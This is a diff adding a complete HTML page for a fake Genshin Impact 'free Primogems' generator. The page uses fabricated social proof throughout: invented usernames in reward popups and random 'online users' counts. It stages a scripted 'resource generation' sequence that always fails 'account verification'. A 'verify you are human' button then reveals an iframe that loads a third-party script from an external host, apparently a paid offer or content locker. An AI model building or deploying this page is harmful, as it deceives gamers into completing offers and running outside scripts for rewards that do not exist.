@@ -1,0 +1,1174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Genshin Impact Primogems Tool</title>
+  <meta name="description" content="Get free Primogems for Genshin Impact using our updated 2025 tool. 100% working with no verification required!">
+  <meta name="keywords" content="Genshin Impact Primogems, Free Primogems Tool, Genshin Impact Hack 2025, Primogems Tool, Genshin Tool no survey">
+  <meta name="author" content="GenshinToolTeam">
+  <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      height: 100%;
+      font-family: 'Rajdhani', sans-serif;
+      overflow-x: hidden;
+      background: #6f42c1;
+    }
+
+    #loading-screen {
+      position: fixed;
+      inset: 0;
+      background: #000;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      transition: opacity 0.5s ease;
+    }
+
+    .spinner {
+      border: 6px solid rgba(255, 255, 255, 0.2);
+      border-top: 6px solid #fff;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 10px;
+    }
+
+    .loading-info {
+      color: white;
+      font-size: 22px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    canvas#background-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    #main-content {
+      display: none;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      position: relative;
+      z-index: 2;
+      padding: 20px 0;
+    }
+
+    .center-box {
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 20px;
+      padding: 60px 20px 20px;
+      width: 95%;
+      max-width: 600px;
+      color: white;
+      text-align: center;
+      box-shadow: 0 0 50px rgba(0,0,0,0.5);
+      backdrop-filter: blur(12px);
+      border: 5px solid white;
+      position: relative;
+      margin: 20px auto;
+      transition: all 0.3s ease;
+    }
+
+    .game-image {
+      width: 100px;
+      height: 100px;
+      object-fit: cover;
+      border-radius: 14px;
+      border: 4px solid white;
+      position: absolute;
+      top: -50px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #fff;
+    }
+
+    .game-title {
+      font-size: 32px;
+      font-weight: 700;
+      margin-top: 0;
+      margin-bottom: 0;
+      letter-spacing: 1px;
+      color: #ffffff;
+    }
+
+    .game-subtitle {
+      display: block;
+      font-size: 24px;
+      font-weight: 600;
+      color: #ffffff;
+      margin-top: 0;
+      letter-spacing: 1px;
+    }
+
+    .stats-row {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      margin-bottom: 10px;
+      margin-top: 5px;
+      flex-wrap: wrap;
+    }
+
+    .stat-box {
+      flex: 1;
+      min-width: 80px;
+      background: rgba(255,255,255,0.15);
+      padding: 8px;
+      border-radius: 10px;
+      font-size: 14px;
+      border: 2px solid white;
+      margin-bottom: 5px;
+      transform: translateY(-10px);
+    }
+
+    .cta-text {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 15px;
+      padding: 0 10px;
+    }
+
+    .start-btn {
+      background: linear-gradient(90deg, #00c853, #64dd17);
+      border: none;
+      padding: 14px 30px;
+      font-size: 18px;
+      font-weight: bold;
+      color: white;
+      border-radius: 28px;
+      cursor: pointer;
+      animation: pulse 1.2s infinite;
+      width: 90%;
+      max-width: 250px;
+      transition: all 0.3s ease;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.5); }
+      70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(0, 200, 83, 0); }
+      100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 200, 83, 0); }
+    }
+
+    .modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 99999;
+      display: none;
+    }
+
+    .modal-box {
+      background: white;
+      border-radius: 20px;
+      padding: 25px;
+      text-align: center;
+      min-width: 280px;
+      max-width: 90%;
+      font-size: 20px;
+      font-weight: bold;
+      color: #333;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    }
+
+    .modal-spinner {
+      border: 6px solid rgba(0, 122, 255, 0.2);
+      border-top: 6px solid #2196F3;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+
+    .checkmark-circle {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      border: 3px solid #4CAF50;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 15px;
+    }
+
+    .checkmark-circle::after {
+      content: "✓";
+      font-size: 32px;
+      color: #4CAF50;
+      font-weight: bold;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      text-align: center;
+      padding: 0 10px;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 10px;
+      font-size: 20px;
+      font-weight: 600;
+      color: white;
+    }
+
+    .input-field {
+      width: 100%;
+      max-width: 400px;
+      padding: 12px 15px;
+      border-radius: 10px;
+      border: 2px solid white;
+      background: rgba(255,255,255,0.1);
+      color: white;
+      font-size: 16px;
+      font-weight: 500;
+      text-align: center;
+      margin: 0 auto;
+      transition: all 0.3s ease;
+    }
+
+    .input-field:focus {
+      outline: none;
+      background: rgba(255,255,255,0.2);
+      box-shadow: 0 0 10px rgba(255,255,255,0.3);
+    }
+
+    .platforms-container {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+      padding: 0 10px;
+    }
+
+    .platform-btn {
+      background: rgba(0,0,0,0.3);
+      border: 2px solid rgba(255,255,255,0.2);
+      border-radius: 10px;
+      padding: 8px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 70px;
+      height: 70px;
+    }
+
+    .platform-btn:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    }
+
+    .platform-btn.active {
+      background: rgba(0,200,83,0.3);
+      border-color: #00c853;
+      transform: translateY(-5px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+    }
+
+    .platform-icon {
+      font-size: 35px;
+      color: white;
+    }
+
+    .amounts-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+      padding: 0 10px;
+    }
+
+    .amount-btn {
+      background: rgba(0,0,0,0.3);
+      border: 2px solid rgba(255,255,255,0.2);
+      border-radius: 15px;
+      padding: 12px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 120px;
+      height: 120px;
+      position: relative;
+    }
+
+    .amount-icon {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .amount-icon img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      filter: drop-shadow(0 0 8px rgba(255,215,0,0.7));
+    }
+
+    .amount-text {
+      font-size: 16px;
+      font-weight: 700;
+      color: white;
+      text-align: center;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+      line-height: 1.2;
+    }
+
+    .amount-btn:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      background: rgba(255,255,255,0.15);
+    }
+
+    .amount-btn.active {
+      background: rgba(0,200,83,0.3);
+      border-color: #00c853;
+      transform: translateY(-5px);
+      box-shadow: 0 5px 20px rgba(0,200,83,0.5);
+    }
+
+    .continue-btn {
+      background: #00c853;
+      border: none;
+      padding: 12px 25px;
+      font-size: 16px;
+      font-weight: bold;
+      color: white;
+      border-radius: 28px;
+      cursor: pointer;
+      transition: all 0.3s;
+      width: auto;
+      margin: 0 auto;
+      display: block;
+    }
+
+    .continue-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 200, 83, 0.4);
+      background: #00e676;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .section-title {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      color: white;
+      text-align: center;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+      padding: 0 10px;
+    }
+
+    /* Verification System Styles */
+    #verification-system {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.8);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 999999;
+      display: none;
+    }
+
+    .verification-box {
+      position: absolute;
+      width: 300px;
+      height: 180px;
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.5s ease;
+      text-align: center;
+      opacity: 0;
+      transition: opacity 0.5s ease;
+    }
+
+    .verification-box.active {
+      opacity: 1;
+    }
+
+    .verification-spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #e0e0e0;
+      border-top: 5px solid #3498db;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+
+    .verification-icon {
+      width: 50px;
+      height: 50px;
+      margin-bottom: 15px;
+      position: relative;
+    }
+
+    .verification-checkmark, .verification-cross {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .verification-checkmark {
+      border: 3px solid #2ecc71;
+    }
+
+    .verification-checkmark::after {
+      content: "";
+      position: absolute;
+      width: 18px;
+      height: 30px;
+      border: solid #2ecc71;
+      border-width: 0 4px 4px 0;
+      transform: rotate(45deg);
+    }
+
+    .verification-cross {
+      border: 3px solid #e74c3c;
+    }
+
+    .verification-cross::before, .verification-cross::after {
+      content: "";
+      position: absolute;
+      width: 30px;
+      height: 4px;
+      background: #e74c3c;
+    }
+
+    .verification-cross::before { transform: rotate(45deg); }
+    .verification-cross::after { transform: rotate(-45deg); }
+
+    .verification-message {
+      font-size: 18px;
+      font-weight: 600;
+      color: #333;
+      text-align: center;
+      line-height: 1.4;
+    }
+
+    .verification-message span {
+      display: block;
+    }
+
+    /* Final Verification Screen */
+    .final-verification {
+      text-align: center;
+      padding: 10px;
+    }
+
+    .verify-btn {
+      background: linear-gradient(90deg, #00c853, #64dd17);
+      border: none;
+      padding: 14px 30px;
+      font-size: 18px;
+      font-weight: bold;
+      color: white;
+      border-radius: 28px;
+      cursor: pointer;
+      margin-top: 15px;
+      animation: pulse 1.2s infinite;
+      width: 90%;
+      max-width: 250px;
+      transition: all 0.3s ease;
+    }
+
+    .final-title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: white;
+    }
+
+    .final-subtitle {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 15px;
+      color: white;
+    }
+    
+    /* CPA Popup Animation Styles */
+    .popup {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      display: flex;
+      align-items: center;
+      opacity: 0;
+      transform: translate(150%, -150%);
+      transition: all 0.6s ease-in-out;
+      z-index: 9999999;
+    }
+
+    .popup.show {
+      opacity: 1;
+      transform: translate(0, 0);
+    }
+
+    .logo-circle {
+      width: 60px;
+      height: 60px;
+      min-width: 60px;
+      border-radius: 50%;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    }
+
+    .logo-circle img {
+      width: 45px;
+      height: 45px;
+      object-fit: contain;
+    }
+
+    .popup-box {
+      background: white;
+      padding: 12px 16px;
+      margin-left: 10px;
+      border-radius: 14px;
+      display: flex;
+      flex-direction: column;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      min-width: 180px;
+    }
+
+    .username {
+      font-weight: bold;
+      font-size: 16px;
+      margin-bottom: 4px;
+    }
+
+    .balance {
+      font-size: 14px;
+      color: #444;
+      font-weight: bold;
+      margin-bottom: 4px;
+    }
+
+    .reward {
+      font-size: 12px;
+      color: #777;
+    }
+
+    /* Iframe Styles */
+    .iframe-container {
+      width: 100%;
+      height: 1000px;
+      margin: 20px 0;
+      border: none;
+      display: none;
+      background: white;
+      border-radius: 15px;
+      overflow: hidden;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    }
+
+    .iframe-container iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    @media (max-width: 768px) {
+      .iframe-container {
+        height: 800px;
+      }
+      
+      .game-title {
+        font-size: 28px;
+      }
+      
+      .game-subtitle {
+        font-size: 20px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .iframe-container {
+        height: 700px;
+      }
+      
+      .game-title {
+        font-size: 26px;
+      }
+      
+      .game-subtitle {
+        font-size: 18px;
+      }
+      
+      .stat-box {
+        min-width: 70px;
+        font-size: 12px;
+        padding: 6px;
+      }
+      
+      .platform-btn {
+        width: 60px;
+        height: 60px;
+      }
+      
+      .platform-icon {
+        font-size: 30px;
+      }
+      
+      .amount-btn {
+        width: 100px;
+        height: 100px;
+      }
+      
+      .amount-icon {
+        width: 50px;
+        height: 50px;
+      }
+      
+      .amount-text {
+        font-size: 14px;
+      }
+      
+      .verification-box {
+        width: 280px;
+        height: 160px;
+      }
+      
+      .popup {
+        top: 10px;
+        right: 10px;
+      }
+      
+      .logo-circle {
+        width: 50px;
+        height: 50px;
+        min-width: 50px;
+      }
+      
+      .logo-circle img {
+        width: 40px;
+        height: 40px;
+      }
+      
+      .popup-box {
+        padding: 10px 12px;
+        min-width: 160px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- CPA Popup Animation -->
+  <div class="popup" id="popup">
+    <div class="logo-circle">
+      <img src="https://ontweak.com/genshinimpact/res/profile.png" alt="logo">
+    </div>
+    <div class="popup-box">
+      <div class="username" id="popup-username">Loading...</div>
+      <div class="balance" id="popup-balance">6480 + 100K</div>
+      <div class="reward">Primogems & Mora</div>
+    </div>
+  </div>
+
+  <div id="loading-screen">
+    <div class="spinner"></div>
+    <div class="loading-info">
+      <span>Loading...</span>
+      <span id="progress">0%</span>
+    </div>
+  </div>
+
+  <canvas id="background-canvas"></canvas>
+
+  <div id="main-content">
+    <div class="center-box" id="start-screen">
+      <img src="https://play-lh.googleusercontent.com/-gSYfE68AvxlSAiKzXThyDw1-iUlwBJGsJBAXllBA8i_NM7kvft32U2DYSmQFglaOaw" alt="Genshin Icon" class="game-image">
+      <div class="game-title">Genshin Impact<span class="game-subtitle"> Tool</span></div>
+
+      <div class="stats-row">
+        <div class="stat-box">Status:<br><b style="color:#00e676">Online</b></div>
+        <div class="stat-box">Last Update:<br><b>Aug 04 2025</b></div>
+        <div class="stat-box">Online Users:<br><b id="online-users">385</b></div>
+      </div>
+
+      <div class="cta-text">Click on the button below to begin the process.</div>
+      <button class="start-btn" onclick="startMod()">Start Tool</button>
+    </div>
+
+    <div class="center-box hidden" id="form-screen">
+      <img src="https://play-lh.googleusercontent.com/-gSYfE68AvxlSAiKzXThyDw1-iUlwBJGsJBAXllBA8i_NM7kvft32U2DYSmQFglaOaw" alt="Genshin Icon" class="game-image">
+      <div class="game-title">Genshin Impact<span class="game-subtitle"> Tool</span></div>
+
+      <div class="stats-row">
+        <div class="stat-box">Status:<br><b style="color:#00e676">Online</b></div>
+        <div class="stat-box">Last Update:<br><b>Aug 04 2025</b></div>
+        <div class="stat-box">Online Users:<br><b id="online-users-2">385</b></div>
+      </div>
+
+      <div class="input-group">
+        <label for="username">Enter Your Username/UserID</label>
+        <input type="text" id="username" class="input-field" placeholder="Enter your username">
+      </div>
+
+      <div class="section-title">Choose Your Platform</div>
+      <div class="platforms-container">
+        <div class="platform-btn" onclick="selectPlatform(this)" title="Android">
+          <i class="fab fa-android platform-icon"></i>
+        </div>
+        <div class="platform-btn" onclick="selectPlatform(this)" title="iOS">
+          <i class="fab fa-apple platform-icon"></i>
+        </div>
+        <div class="platform-btn" onclick="selectPlatform(this)" title="PS5">
+          <i class="fab fa-playstation platform-icon"></i>
+        </div>
+        <div class="platform-btn" onclick="selectPlatform(this)" title="Xbox">
+          <i class="fab fa-xbox platform-icon"></i>
+        </div>
+        <div class="platform-btn" onclick="selectPlatform(this)" title="Windows">
+          <i class="fab fa-windows platform-icon"></i>
+        </div>
+      </div>
+
+      <div class="section-title">Select Primogems & Mora Amount</div>
+      <div class="amounts-container">
+        <div class="amount-btn" onclick="selectAmount(this)">
+          <div class="amount-icon">
+            <img src="https://ontweak.com/genshinimpact/res/gold.png" alt="Primogems">
+          </div>
+          <div class="amount-text">6480+100K</div>
+        </div>
+        <div class="amount-btn" onclick="selectAmount(this)">
+          <div class="amount-icon">
+            <img src="https://ontweak.com/genshinimpact/res/gold.png" alt="Primogems">
+          </div>
+          <div class="amount-text">12960+200K</div>
+        </div>
+        <div class="amount-btn" onclick="selectAmount(this)">
+          <div class="amount-icon">
+            <img src="https://ontweak.com/genshinimpact/res/gold.png" alt="Primogems">
+          </div>
+          <div class="amount-text">25920+400K</div>
+        </div>
+      </div>
+
+      <button class="continue-btn" onclick="submitForm()">CONTINUE</button>
+    </div>
+
+    <!-- Final Verification Screen -->
+    <div class="center-box hidden" id="final-verification-screen">
+      <img src="https://play-lh.googleusercontent.com/-gSYfE68AvxlSAiKzXThyDw1-iUlwBJGsJBAXllBA8i_NM7kvft32U2DYSmQFglaOaw" alt="Genshin Icon" class="game-image">
+      <div class="game-title">Genshin Impact<span class="game-subtitle"> Tool</span></div>
+      
+      <div class="stats-row">
+        <div class="stat-box">Status:<br><b style="color:#00e676">Online</b></div>
+        <div class="stat-box">Last Update:<br><b>Aug 04 2025</b></div>
+        <div class="stat-box">Online Users:<br><b id="online-users-final">350</b></div>
+      </div>
+
+      <div class="cta-text" id="verification-text">You are almost done! Please, complete this final step by clicking on the button below and follow all stated instructions in order to verify you are a human.</div>
+      <button class="verify-btn" id="verify-btn" onclick="verifyHuman()">VERIFY</button>
+      <div class="iframe-container" id="iframe-container">
+        <iframe srcdoc='
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+            <meta charset="UTF-8" />
+            <script type="text/javascript">
+              var yaEGk_mPL_BZNrSc ={"it":4535449,"key":"40a00"};
+            </script>
+            <script src="https://dlk457skl57zp.cloudfront.net/17ad4b1.js"></script>
+            <style>
+              body {
+                margin: 0; padding: 0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                background: #fff;
+              }
+            </style>
+          </head>
+          <body>
+            <script>_Wi();</script>
+          </body>
+          </html>
+        '></iframe>
+      </div>
+    </div>
+  </div>
+
+  <div class="modal" id="modModal">
+    <div class="modal-box" id="modalContent">
+      <div class="modal-spinner" id="modalSpinner"></div>
+      <div id="modalText">Loading</div>
+    </div>
+  </div>
+
+  <!-- Verification System -->
+  <div id="verification-system">
+    <!-- Search Phase -->
+    <div class="verification-box active" id="searching">
+      <div class="verification-spinner"></div>
+      <div class="verification-message">
+        <span>Looking For Username</span>
+      </div>
+    </div>
+
+    <!-- Player Found -->
+    <div class="verification-box" id="player-found">
+      <div class="verification-icon"><div class="verification-checkmark"></div></div>
+      <div class="verification-message">
+        <span>Player Found</span>
+      </div>
+    </div>
+
+    <!-- Generating -->
+    <div class="verification-box" id="generating">
+      <div class="verification-spinner"></div>
+      <div class="verification-message">
+        <span>Generating Resources</span>
+      </div>
+    </div>
+
+    <!-- Resources Generated -->
+    <div class="verification-box" id="resource-generated">
+      <div class="verification-icon"><div class="verification-checkmark"></div></div>
+      <div class="verification-message">
+        <span>Resource Generated</span>
+      </div>
+    </div>
+
+    <!-- Verifying -->
+    <div class="verification-box" id="verifying">
+      <div class="verification-spinner"></div>
+      <div class="verification-message">
+        <span>Verifying Account</span>
+      </div>
+    </div>
+
+    <!-- Error -->
+    <div class="verification-box" id="error">
+      <div class="verification-icon"><div class="verification-cross"></div></div>
+      <div class="verification-message">
+        <span>Unable To Verify Account Owner</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // CPA Popup Animation Script
+    const names = [
+      "AidenHD357","AidenVlogs997","Amelia99318","AmeliaPlays842","Aria99942",
+      "BenjaminTV51","BenjaminYT329","CharlotteOG642","CharlottePro36","ChloeYT634",
+      "ElijahGamer23","EllaYT82","EmmaHD68","EmmaPro213","EvelynTV741",
+      "GraceXx911","GraceYT392","HarperYT296","HenryYT360","IslaYT817",
+      "JacksonPro153","JamesPlays6","JamesYT460","LeviPlays940","LeviYT787",
+      "LiamPlays524","LiamPro214","LoganHD21","LoganUSA81","LucaTV86",
+      "LucasYT732","LunaYT442","MasonPro158","MateoYT253","NoahGamer938",
+      "NoahYT34","OliviaPlays272","OliviaYT46","OliviaYT683","SebastianGamer36",
+      "SophiaPro712","SophiaYT942","WilliamGamer72","WilliamPro841","ZoePlays146",
+      "ZoeVlogs298","AvaYT134","HarperPlays978","ZoeUSA892","LunaPlays194",
+      "HenryHD889","AvaTV611","LoganVlogs718","MateoHD377","LiamYT933",
+      "NoahPro489","JacksonHD505","SebastianYT912","CharlotteYT186","AriaTV812",
+      "ElijahPro653","ChloeTV385","EvelynYT498"
+    ];
+
+    const rewards = [
+      "6480 + 100K", "6480 + 100K",
+      "12960 + 200K", "12960 + 200K",
+      "25920 + 400K", "25920 + 400K"
+    ];
+
+    const popup = document.getElementById("popup");
+    const usernameEl = document.getElementById("popup-username");
+    const balanceEl = document.getElementById("popup-balance");
+
+    function getRandomName() {
+      return names[Math.floor(Math.random() * names.length)];
+    }
+
+    function getRandomReward() {
+      return rewards[Math.floor(Math.random() * rewards.length)];
+    }
+
+    function showPopup() {
+      const name = getRandomName();
+      const reward = getRandomReward();
+
+      usernameEl.textContent = name;
+      balanceEl.textContent = reward;
+
+      popup.classList.add("show");
+
+      setTimeout(() => {
+        popup.classList.remove("show");
+      }, 3000);
+    }
+
+    // Start showing popups after page loads
+    setTimeout(() => {
+      showPopup();
+      setInterval(showPopup, 4500);
+    }, 2000);
+
+    // Main Script
+    let progress = 0;
+    const progressText = document.getElementById('progress');
+    const loadingScreen = document.getElementById('loading-screen');
+    const mainContent = document.getElementById('main-content');
+    const startScreen = document.getElementById('start-screen');
+    const formScreen = document.getElementById('form-screen');
+    const finalVerificationScreen = document.getElementById('final-verification-screen');
+    const verificationSystem = document.getElementById('verification-system');
+    const iframeContainer = document.getElementById('iframe-container');
+    const verificationText = document.getElementById('verification-text');
+    const verifyBtn = document.getElementById('verify-btn');
+
+    const loadingInterval = setInterval(() => {
+      progress++;
+      progressText.textContent = progress + '%';
+      if (progress >= 100) {
+        clearInterval(loadingInterval);
+        loadingScreen.style.opacity = '0';
+        setTimeout(() => {
+          loadingScreen.style.display = 'none';
+          mainContent.style.display = 'flex';
+          initTriangles();
+        }, 1000);
+      }
+    }, 20);
+
+    const onlineSpan = document.getElementById("online-users");
+    const onlineSpan2 = document.getElementById("online-users-2");
+    const onlineSpanFinal = document.getElementById("online-users-final");
+    setInterval(() => {
+      const randomUsers = Math.floor(350 + Math.random() * 50);
+      onlineSpan.textContent = randomUsers;
+      onlineSpan2.textContent = randomUsers;
+      onlineSpanFinal.textContent = randomUsers;
+    }, 2500);
+
+    function initTriangles() {
+      const canvas = document.getElementById('background-canvas');
+      const ctx = canvas.getContext('2d');
+      let width = canvas.width = window.innerWidth;
+      let height = canvas.height = window.innerHeight;
+      const points = [];
+      const pointCount = 80;
+
+      for (let i = 0; i < pointCount; i++) {
+        points.push({
+          x: Math.random() * width,
+          y: Math.random() * height,
+          vx: (Math.random() - 0.5) * 0.6,
+          vy: (Math.random() - 0.5) * 0.6
+        });
+      }
+
+      function draw() {
+        ctx.clearRect(0, 0, width, height);
+        ctx.lineWidth = 1.2;
+        for (let i = 0; i < points.length; i++) {
+          let p1 = points[i];
+          p1.x += p1.vx;
+          p1.y += p1.vy;
+          if (p1.x < 0 || p1.x > width) p1.vx *= -1;
+          if (p1.y < 0 || p1.y > height) p1.vy *= -1;
+          ctx.fillStyle = 'black';
+          drawTriangle(ctx, p1.x, p1.y, 6, 0);
+
+          for (let j = i + 1; j < points.length; j++) {
+            let p2 = points[j];
+            const dx = p1.x - p2.x;
+            const dy = p1.y - p2.y;
+            const dist = Math.sqrt(dx * dx + dy * dy);
+            if (dist < 130) {
+              ctx.beginPath();
+              ctx.strokeStyle = 'rgba(0, 0, 0,' + (1 - dist / 130) + ')';
+              ctx.moveTo(p1.x, p1.y);
+              ctx.lineTo(p2.x, p2.y);
+              ctx.stroke();
+              ctx.closePath();
+            }
+          }
+        }
+        requestAnimationFrame(draw);
+      }
+
+      function drawTriangle(ctx, x, y, size, rotation = 0) {
+        const height = size * Math.sqrt(3) / 2;
+        ctx.save();
+        ctx.translate(x, y);
+        ctx.rotate(rotation);
+        ctx.beginPath();
+        ctx.moveTo(-size / 2, height / 3);
+        ctx.lineTo(size / 2, height / 3);
+        ctx.lineTo(0, -2 * height / 3);
+        ctx.closePath();
+        ctx.fill();
+        ctx.restore();
+      }
+
+      draw();
+
+      window.addEventListener('resize', () => {
+        width = canvas.width = window.innerWidth;
+        height = canvas.height = window.innerHeight;
+      });
+    }
+
+    function startMod() {
+      const modal = document.getElementById('modModal');
+      const modalText = document.getElementById('modalText');
+      const spinner = document.getElementById('modalSpinner');
+
+      modal.style.display = 'flex';
+      modalText.textContent = 'Loading';
+      spinner.style.display = 'block';
+
+      setTimeout(() => {
+        spinner.style.display = 'none';
+        modalText.innerHTML = '<div class="checkmark-circle"></div>Started Tool Successfully';
+        
+        setTimeout(() => {
+          modal.style.display = 'none';
+          startScreen.classList.add('hidden');
+          formScreen.classList.remove('hidden');
+        }, 1500);
+      }, 2500);
+    }
+
+    function selectPlatform(selectedBtn) {
+      document.querySelectorAll('.platform-btn').forEach(btn => {
+        btn.classList.remove('active');
+      });
+      selectedBtn.classList.add('active');
+    }
+
+    function selectAmount(selectedBtn) {
+      document.querySelectorAll('.amount-btn').forEach(btn => {
+        btn.classList.remove('active');
+      });
+      selectedBtn.classList.add('active');
+    }
+
+    function showVerificationStep(stepId) {
+      // Hide all verification boxes
+      document.querySelectorAll('.verification-box').forEach(box => {
+        box.classList.remove('active');
+      });
+      
+      // Show the requested step
+      document.getElementById(stepId).classList.add('active');
+    }
+
+    function submitForm() {
+      const username = document.getElementById('username').value;
+      const selectedPlatform = document.querySelector('.platform-btn.active');
+      const selectedAmount = document.querySelector('.amount-btn.active');
+      
+      if (!username) {
+        alert('Please enter your username');
+        return;
+      }
+      
+      if (!selectedPlatform) {
+        alert('Please select your platform');
+        return;
+      }
+      
+      if (!selectedAmount) {
+        alert('Please select Primogems & Mora amount');
+        return;
+      }
+      
+      // Show verification system
+      verificationSystem.style.display = 'flex';
+      showVerificationStep('searching');
+      
+      // Start verification sequence with delays between steps
+      setTimeout(() => {
+        showVerificationStep('player-found');
+        
+        setTimeout(() => {
+          showVerificationStep('generating');
+          
+          setTimeout(() => {
+            showVerificationStep('resource-generated');
+            
+            setTimeout(() => {
+              showVerificationStep('verifying');
+              
+              setTimeout(() => {
+                showVerificationStep('error');
+                
+                // Close verification after showing error
+                setTimeout(() => {
+                  verificationSystem.style.display = 'none';
+                  formScreen.classList.add('hidden');
+                  finalVerificationScreen.classList.remove('hidden');
+                }, 3000);
+              }, 3000);
+            }, 3000);
+          }, 3000);
+        }, 2000);
+      }, 3000);
+    }
+
+    function verifyHuman() {
+      // إخفاء نص التحقق والزر مباشرة
+      verificationText.style.display = 'none';
+      verifyBtn.style.display = 'none';
+      
+      // عرض iframe بالحجم الكبير
+      iframeContainer.style.display = 'block';
+      
+      // التمرير لأسفل لعرض iframe كامل
+      iframeContainer.scrollIntoView({ behavior: 'smooth' });
+    }
+  </script> 
+</body>
+</html>
